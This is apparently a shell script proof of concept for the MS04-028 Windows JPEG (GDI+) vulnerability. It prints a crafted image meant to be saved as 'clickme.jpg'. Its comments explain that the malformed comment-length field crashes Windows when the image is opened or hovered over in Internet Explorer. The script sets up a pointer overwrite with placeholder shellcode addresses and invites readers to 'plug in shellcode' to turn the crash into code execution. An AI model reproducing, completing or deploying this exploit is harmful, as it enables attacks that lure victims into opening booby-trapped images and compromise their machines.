#!/bin/sh
#
# The JPEG vuln is triggered by the 0 or 1 length field with an integer flaw
# The crafted JPEG header makes Windows crash a couple of different ways
# 	1) First, it crashes when the image is opened.
# 	2) Second, it crashes when hovering the mouse over the image.
#
# The pointer overwrite is pretty straight forward in a debugger
#
# Usage: 
#	sh ms04-028.sh > clickme.jpg
#
# Note: This isn't a ./hack
# 	- Plug in shellcode and get the address
#	- You non-kiddies out there are smart enough to fill in the blanks
#	- Until you do the above, it's just a stupid PoC crash
#
# It's ugly, but it works :)
#
# -perplexy-

#JPEG header 'n stuff
printf "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46"
printf "\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00"

#Trigger string - 00 length field (01 works too)
printf "\xFF\xFE\x00\x00"

printf "\x45\x78\x69\x66\x00\x00\x49\x49\x2A\x00\x08\x00"

# 1) Opening directly in IE
#Address to overwrite = RtlEnterCriticalSelection() - 4
#Check page 172 of SC Handbook for those of you playing along at home
printf "\x1C\xF0\xFD\x7F"

# 1) Opening directly in IE
#Address of shellcode
printf "\x41\x41\x41\x41"

#Other stuff
printf "\x96\x02\x00\x00\x1A\x00\x00\x00"

# 2) MouseOver in IE
#Address to overwrite = RtlEnterCriticalSelection() - 4
#Check page 172 of SC Handbook for those of you playing along at home
printf "\x1C\xF0\xFD\x7F";

# 2) MouseOver in IE
#Address of shellcode
printf "\x41\x41\x41\x41"

#Comments here
perl -e 'print "A"x1000';

#Image junk here
printf "\x00\x00\x00\xFF\xDB\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07";
printf "\x07\x09\x09\x08\x0A\x0C\x14\x0D\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14";
printf "\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C\x20\x24\x2E\x27\x20\x22\x2C\x23\x1C";
printf "\x1C\x28\x37\x29\x2C\x30\x31\x34\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C";
printf "\x2E\x33\x34\x32\xFF\xDB\x00\x43\x01\x09\x09\x09\x0C\x0B\x0C\x18\x0D";
printf "\x0D\x18\x32\x21\x1C\x21\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32";
printf "\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32";
printf "\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32";
printf "\x32\x32\x32\x32\x32\xFF\xC0\x00\x11\x08\x00\x03\x00\x03\x03\x01\x22";
printf "\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01";
printf "\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05";
printf "\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02";
printf "\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00\x04\x11\x05";
printf "\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22\x71\x14\x32\x81\x91\xA1\x08";
printf "\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33\x62\x72\x82\x09\x0A\x16\x17";
printf "\x18\x19\x1A\x25\x26\x27\x28\x29\x2A\x34\x35\x36\x37\x38\x39\x3A\x43";
printf "\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64";
printf "\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85";
printf "\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4";
printf "\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3";
printf "\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1";
printf "\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8";
printf "\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01";
printf "\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A";
printf "\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04";
printf "\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41";
printf "\x51\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09\x23";
printf "\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1\x17\x18\x19";
printf "\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47";
printf "\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68";
printf "\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x82\x83\x84\x85\x86\x87\x88";
printf "\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7";
printf "\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6";
printf "\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5";
printf "\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00";
printf "\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xF9\xFE\x8A\x28\xA0\x0F";
printf "\xFF\xD9";
